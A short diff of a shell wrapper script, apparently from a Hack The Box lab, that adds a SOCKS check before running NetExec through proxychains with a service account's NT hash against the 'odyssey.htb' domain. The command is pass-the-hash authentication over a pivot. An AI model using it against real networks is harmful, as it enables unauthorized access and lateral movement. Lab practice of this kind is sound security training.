@@ -13,4 +13,5 @@ fi
   exit 1
 }
 
+require_socks
 exec proxychains4 -q nxc "$@" -d odyssey.htb -u svc-aegis-deploy -H "$nt_hash"
